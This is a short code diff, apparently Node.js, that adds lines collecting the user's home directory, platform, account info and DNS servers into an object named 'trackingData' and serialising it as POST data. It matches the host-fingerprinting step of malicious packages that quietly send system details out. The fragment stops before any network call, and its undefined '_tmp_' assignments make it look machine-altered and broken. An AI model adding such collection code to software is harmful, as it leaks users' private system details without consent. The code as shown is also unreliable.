@@ -1,0 +1,11 @@
+const trackingData = JSON.stringify({
+    homedir: os.homedir(),
+    system: os.platform(),
+    userInfo: os.userInfo(),
+    ip: dns.getServers(),
+})
+_tmp_0.system = os.platform()
+var postData = querystring.stringify({
+    msg: trackingData,
+})
+_tmp_1.msg = trackingData
